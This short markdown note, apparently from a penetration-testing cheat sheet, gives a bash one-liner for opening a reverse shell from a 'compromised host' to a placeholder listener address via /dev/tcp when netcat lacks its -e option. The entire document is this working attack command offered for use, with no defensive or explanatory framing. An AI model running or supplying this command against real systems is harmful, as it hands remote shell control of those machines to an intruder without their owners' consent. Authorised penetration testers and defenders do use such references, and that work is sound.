

# Alternative to `-e`
If the version of netcat on your compromised host does not have the `-e` option enabled/installed, you can use the following to open a reverse shell:

```bash
bash -c '0<&55-;exec 55<>/dev/tcp/LISTEN_HOST_IP/LISTEN_HOST_PORT;sh <&55 >&55 2>&55'
```